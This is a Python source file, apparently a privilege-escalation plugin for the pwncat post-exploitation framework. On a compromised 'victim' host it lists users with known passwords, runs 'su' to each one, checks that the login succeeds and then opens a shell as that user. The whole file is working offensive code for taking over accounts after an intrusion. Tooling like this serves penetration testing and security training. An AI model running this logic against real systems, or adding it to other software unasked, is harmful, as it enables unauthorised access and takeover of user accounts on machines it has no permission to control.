#!/usr/bin/env python3
from typing import List

from colorama import Fore

import pwncat
from pwncat.gtfobins import Capability
from pwncat.privesc import BaseMethod, Technique, PrivescError


class Method(BaseMethod):

    name = "su"
    BINARIES = ["su"]

    def enumerate(self, capability=Capability.ALL) -> List[Technique]:

        result = []
        current_user = pwncat.victim.whoami()

        for user, info in pwncat.victim.users.items():
            if user == current_user:
                continue
            if info.password is not None or current_user == "root":
                result.append(
                    Technique(
                        user=user,
                        method=self,
                        ident=info.password,
                        capabilities=Capability.SHELL,
                    )
                )

        return result

    def execute(self, technique: Technique):

        current_user = pwncat.victim.current_user

        password = technique.ident.encode("utf-8")

        if current_user.name != "root":
            # Send the su command, and check if it succeeds
            pwncat.victim.run(
                f'su {technique.user} -c "echo good"', wait=False,
            )

            pwncat.victim.recvuntil(": ")
            pwncat.victim.client.send(password + b"\n")

            # Read the response (either "Authentication failed" or "good")
            result = pwncat.victim.recvuntil("\n")
            # Probably, the password wasn't echoed. But check all variations.
            if password in result or result == b"\r\n" or result == b"\n":
                result = pwncat.victim.recvuntil("\n")

            if b"failure" in result.lower() or b"good" not in result.lower():
                raise PrivescError(f"{technique.user}: invalid password")

        pwncat.victim.process(f"su {technique.user}", delim=False)

        if current_user.name != "root":
            pwncat.victim.recvuntil(": ")
            pwncat.victim.client.sendall(technique.ident.encode("utf-8") + b"\n")
            pwncat.victim.flush_output()

        return "exit"

    def get_name(self, tech: Technique):
        return f"{Fore.RED}known password{Fore.RESET}"
